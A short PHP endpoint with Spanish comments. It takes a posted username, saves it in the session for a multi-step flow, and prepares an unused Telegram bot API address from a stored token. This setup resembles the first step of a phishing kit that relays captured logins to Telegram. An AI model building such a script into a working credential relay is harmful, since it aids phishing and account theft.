<?php
session_start();
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo '{"success": false}';
}

$data = json_decode(file_get_contents("php://input"), true);

require_once("settings.php");
$website = "https://api.telegram.org/bot$token";

if (isset($data['usuario']) ) {
    $usuario = trim($data['usuario']);
    $_SESSION["usuario"] = $usuario; // ← Guardamos el usuario para el resto del flujo

    // Redirección
    echo '{"success": true}';
    exit;
}
?>
